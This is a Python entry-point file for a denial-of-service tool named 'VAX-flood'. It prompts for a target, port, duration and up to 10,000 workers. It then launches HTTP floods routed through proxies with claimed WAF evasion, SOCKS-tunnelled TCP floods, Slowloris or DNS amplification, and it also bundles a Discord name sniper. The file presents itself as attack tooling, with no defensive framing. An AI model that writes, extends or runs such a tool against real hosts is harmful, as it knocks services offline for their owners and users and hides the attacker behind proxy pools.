# language: Python 3.10+, file: main.py, target: Windows/Linux x64
# deps: pip install aiohttp aiohttp-socks requests colorama python-socks
# run:  python main.py
#
# *ProactorEventLoop (IOCP) set FIRST -- before any asyncio.run() call*
# *mandatory on Windows for 1000+ concurrent workers, no 512-fd select() cap*

import sys, os

# force UTF-8 on Windows consoles that default to cp1252
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

if sys.platform == "win32":
    import asyncio as _asyncio
    _asyncio.set_event_loop_policy(_asyncio.WindowsProactorEventLoopPolicy())

# colorama auto-strips ANSI on Windows consoles that don't natively support it
from colorama import init as _colorama_init
_colorama_init(autoreset=True)

import asyncio, threading, time

from Module.banner        import print_menu, print_prompt, VERSION
from Module.colors        import R, Y, G, C, W, DG, M, RS
from Module.config        import (ask, load_config, save_config,
                                  PROXY_POOL_PATH)
from Module.proxy         import fetch_proxies, validate_proxies, pick_proxy_source
from Module.orchestrator  import run_attack, printer, print_summary
from Module.state         import stats, slock, stop
from Module.discord_sniper import run_discord_sniper
from Module.logger        import log_event

HTTP_METHODS = ["GET", "POST", "HEAD", "PUT", "OPTIONS", "PATCH", "DELETE"]

# ── attack config wizard ───────────────────────────────────────────────
def configure_attack(cfg: dict | None = None):
    """
    Interactive prompt for all attack parameters.
    If *cfg* is already loaded from a saved profile, return its values directly.
    Returns: (target, port, mode, duration, workers, rpp, timeout, mpool, pfilter, do_val)
    """
    if cfg:
        return (
            cfg["target"], cfg["port"], cfg["mode"], cfg["duration"],
            cfg["workers"], cfg["req_per_proxy"], cfg["timeout"],
            cfg["methods"], cfg.get("proxy_filter"), cfg.get("validate", False),
        )

    print(f"\n{R}[{W}>{R}]{RS} Target URL or IP: ", end="")
    target = input().strip()
    if not target:
        sys.exit(1)

    port = ask(f"{R}[{W}>{R}]{RS} Port [{W}80{RS}]: ", int, 80)

    print(f"\n{R}[{W}Attack Mode{R}]{RS}")
    print(f"  {R}[1]{RS} HTTP  Flood  {DG}-- Layer-7, proxy-routed, WAF evasion{RS}")
    print(f"  {R}[2]{RS} TCP   Flood  {DG}-- Layer-4, SOCKS tunnelled{RS}")
    print(f"  {R}[3]{RS} Slowloris   {DG}-- connection exhaustion, direct{RS}")
    print(f"  {R}[4]{RS} DNS   Amp    {DG}-- UDP query blast{RS}")
    mc   = input(f"{R}[{W}>{R}]{RS} Select [{W}1{RS}]: ").strip()
    mode = {"1":"http","01":"http","2":"tcp","02":"tcp",
            "3":"slowloris","03":"slowloris","4":"dns","04":"dns"}.get(mc, "http")

    dur  = ask(f"{R}[{W}>{R}]{RS} Duration seconds [{W}60{RS}]: ", int, 60)
    conc = ask(f"{R}[{W}>{R}]{RS} Workers [{W}500{RS}, max 10000]: ",
               lambda v: min(int(v), 10000), 500)
    rpp  = ask(f"{R}[{W}>{R}]{RS} Requests per proxy [{W}20{RS}]: ", int, 20)
    tout = ask(f"{R}[{W}>{R}]{RS} Timeout seconds [{W}4{RS}]: ", float, 4.0)

    print(f"\n{R}[{W}HTTP Methods{R}]{RS}  1=GET  2=GET+POST  3=All")
    m     = input(f"{R}[{W}>{R}]{RS} Select [{W}1{RS}]: ").strip()
    mpool = {"2": ["GET", "POST"], "3": HTTP_METHODS}.get(m, ["GET"])

    print(f"\n{R}[{W}Proxy Filter{R}]{RS}  1=All  2=SOCKS5  3=SOCKS4  4=HTTP")
    pf      = input(f"{R}[{W}>{R}]{RS} Select [{W}1{RS}]: ").strip()
    pfilter = {"2": ["socks5"], "3": ["socks4"], "4": ["http"]}.get(pf, None)

    do_val = input(f"\n{R}[{W}>{R}]{RS} Validate proxies first? [{W}y/N{RS}]: ").strip().lower() == "y"

    if input(f"{R}[{W}>{R}]{RS} Save as profile? [{W}y/N{RS}]: ").strip().lower() == "y":
        save_config({
            "target": target, "port": port, "mode": mode, "duration": dur,
            "workers": conc, "req_per_proxy": rpp, "timeout": tout,
            "methods": mpool, "proxy_filter": pfilter, "validate": do_val,
        })

    return target, port, mode, dur, conc, rpp, tout, mpool, pfilter, do_val

# ── help text ─────────────────────────────────────────────────────────
def print_help() -> None:
    print(f"\n  {W}Commands:{RS}")
    cmds = [
        ("1",  "DDoS (HTTP Flood + mode select)"),
        ("10", "Discord Name Sniper"),
        ("q",  "Quit"),
        ("h",  "This help"),
        ("v",  "Version"),
    ]
    for num, desc in cmds:
        print(f"  {R}[{W}{num:>2}{R}]{RS}  {W}{desc}{RS}")
    print()


# ── main loop ─────────────────────────────────────────────────────────
def main() -> None:
    print_menu()

    # saved profile check
    cfg = load_config()
    if cfg:
        print(f"{Y}[?] Saved profile found:{RS}")
        for k, v in cfg.items():
            print(f"    {DG}{k}{RS}: {C}{v}{RS}")
        if input(f"{R}[{W}>{R}]{RS} Use saved profile? [{W}y/N{RS}]: ").strip().lower() != "y":
            cfg = None

    print_prompt()
    cmd = input().strip()

    mode_map = {
        "1":"http","01":"http",
        "2":"tcp","02":"tcp",
        "3":"slowloris","03":"slowloris",
        "4":"dns","04":"dns",
    }

    # ── simple commands ───────────────────────────────────────────────
    if cmd.lower() in ("q", "quit", "exit"):
        print(f"\n{DG}[bye]{RS}")
        sys.exit(0)

    if cmd.lower() in ("v", "version"):
        print(f"\n  VAX-flood {W}v{VERSION}{RS}  |  python {sys.version.split()[0]}\n")
        return main()

    if cmd.lower() in ("h", "help"):
        print_help()
        return main()

    # ── [5]  Fetch Proxies ────────────────────────────────────────────
    if cmd in ("5", "05"):
        fetch_proxies()
        return main()

    # ── [6]  Validate Pool ────────────────────────────────────────────
    if cmd in ("6", "06"):
        from Module.config import load_proxy_pool, save_proxy_pool
        pool = load_proxy_pool()
        if pool:
            alive = asyncio.run(validate_proxies(pool))
            save_proxy_pool(alive)
        return main()

    # ── [7]  Load Profile ─────────────────────────────────────────────
    if cmd in ("7", "07"):
        cfg = load_config()
        if cfg:
            print(f"{G}[+] Profile loaded:{RS}")
            for k, v in cfg.items():
                print(f"    {DG}{k}{RS}: {C}{v}{RS}")
        else:
            print(f"{R}[!] No saved profile.{RS}")
        return main()

    # ── [8]  Save Profile ─────────────────────────────────────────────
    if cmd in ("8", "08"):
        target, port, mode, dur, conc, rpp, tout, mpool, pfilter, do_val = configure_attack()
        save_config({
            "target": target, "port": port, "mode": mode, "duration": dur,
            "workers": conc, "req_per_proxy": rpp, "timeout": tout,
            "methods": mpool, "proxy_filter": pfilter, "validate": do_val,
        })
        return main()

    # ── [10]  Discord Name Sniper ─────────────────────────────────────
    if cmd in ("10",):
        run_discord_sniper()
        return main()

    # ── [1-4]  Attack modes ───────────────────────────────────────────
    if cmd not in mode_map and cmd not in ("1","2","3","4","01","02","03","04"):
        print(f"{R}[!] Unknown command '{cmd}'. Type 'h' for help.{RS}")
        return main()

    target, port, mode, dur, conc, rpp, tout, mpool, pfilter, do_val = configure_attack(cfg)

    # override mode if cmd was a shortcut
    if cmd in mode_map:
        mode = mode_map[cmd]

    # proxy setup
    if mode != "dns":
        proxies = pick_proxy_source(pfilter, do_val)
    else:
        proxies = []
        with slock:
            stats["proxies_total"] = 0
            stats["proxies_alive"] = 0

    print(f"\n{G}[+] {len(proxies)} proxies ready{RS}")
    print(f"{Y}[!] Launching in 3s... Ctrl+C to abort{RS}\n")
    time.sleep(3)

    stop[0] = False
    threading.Thread(target=printer, daemon=True).start()

    try:
        asyncio.run(run_attack(target, port, dur, conc, mode,
                               proxies, rpp, tout, mpool, pfilter))
    except KeyboardInterrupt:
        print(f"\n{R}[!] Interrupted{RS}")
    finally:
        stop[0] = True
        time.sleep(1)

    print_summary(target, port, dur)
    return main()


if __name__ == "__main__":
    main()
